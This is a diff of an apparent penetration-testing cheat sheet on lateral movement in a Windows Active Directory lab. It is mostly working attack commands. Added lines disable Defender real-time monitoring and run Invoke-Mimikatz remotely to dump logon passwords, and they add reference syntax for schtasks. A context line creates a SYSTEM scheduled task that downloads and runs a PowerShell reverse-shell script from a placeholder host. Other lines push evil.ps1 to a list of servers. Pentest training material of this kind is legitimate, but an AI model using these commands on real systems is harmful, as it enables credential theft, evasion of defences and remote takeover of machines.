@@ -75,11 +75,22 @@ PS C:\AD\jfc-tools\x64> Invoke-Command -ScriptBlock{hostname;whoami} -computerna
 TEMP-DC
 security-lab\pentester
 
-Note: 'Invoke-command' can also be used to execute a script or a command on multiple Windows servers
+Notes 
 ------
+> 'Invoke-command' can also be used to execute a script or a command on multiple Windows servers
+
 PS C:\AD\jfc-tools\x64> Invoke-command -Filepath C:\AD\Tools\evil.ps1 -ComputerName (get-content c:\path\list-servers.txt) -Credential security-lab\pentester
 or
 PS C:\AD\jfc-tools\x64> Invoke-command -Scriptblock {qwinsta} -ComputerName (get-content c:\path\list-servers.txt) -Credential security-lab\pentester
+
+> Other example:
+
+enter-pssession $session1
+Set-MpPreference -DisableRealtimeMonitoring $true
+exit
+Invoke-Command -FilePath C:\AD\Tools\Invoke-Mimikatz.ps1 -Session $session1
+enter-pssession $session1
+Invoke-Mimikatz -Command '"privilege::debug" "sekurlsa::logonpasswords" "exit"'
 
 
 ========================================================================================================================
@@ -148,6 +159,17 @@ The command completed successfully.
 ========================================================================================================================
 Example 3 - Create remotely a scheduled task (command schtasks) + Powershell reverse shell (InvokePowerShellTcp.ps1)
 ========================================================================================================================
+
+schtasks /create /sc <ScheduleType> /tn <TaskName> /tr <TaskRun> [/s <Computer> [/u [<Domain>\]<User> [/p <Password>]]] [/ru {[<Domain>\]<User> | System}] [/rp <Password>] [/mo <Modifier>] [/d <Day>[,<Day>...] | *] [/m <Month>[,<Month>...]] [/i <IdleTime>] [/st <StartTime>] [/ri <Interval>] [{/et <EndTime> | /du <Duration>} [/k]] [/sd <StartDate>] [/ed <EndDate>] [/it] [/z] [/f]
+/sc <ScheduleType>               : Specifies the schedule type. Valid values are MINUTE, HOURLY, DAILY, WEEKLY, MONTHLY, ONCE, ONSTART, ONLOGON, ONIDLE.
+/tn <TaskName>                   : Specifies a name for the task.
+/tr <TaskRun>                    : Specifies the program or command that the task runs. Type the fully qualified path and file name of an executable file, script file, or batch file. If you omit the path, schtasks assumes that the file is in the SystemRoot\System32 directory.
+/s <Computer>                    : Schedules a task on the specified remote computer. Type the name or IP address of a remote computer (with or without backslashes). The default is the local computer.
+/u [<Domain>\]<User>             : Runs this command with the permissions of the specified user account. The default is the permissions of the current user of the local computer.
+/p <Password>                    : Provides the password for the user account specified in the /u parameter. If you use the /u parameter, but omit the /p parameter or the password argument, schtasks prompts you for a password and obscures the text you type
+/ru {[<Domain>\]<User> | System} : Runs the task with permissions of the specified user account. By default, the task runs with the permissions of the current user of the local computer, or with the permission of the user specified by the /u parameter, if one is included. The /ru parameter is valid when scheduling tasks on local or remote computers.
+/rp <Password>                   : Provides the password for the user account that is specified in the /ru parameter. If you omit this parameter when specifying a user account, SchTasks.exe prompts you for the password and obscures the text you type. Do not use the /rp parameter for tasks run with System account credentials (/ru System). The System account does not have a password and SchTasks.exe does not prompt for one.
+
 
 C:\AD\jfc-tools\x64>schtasks /create /S win-server01.security-Test-Lab.local /SC Weekly /RU "NT Authority\SYSTEM" /TN "testuser" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://X.X.X.X/InvokePowerShellTcp2.ps1''')'"
 SUCCESS: The scheduled task "testuser" has successfully been created.
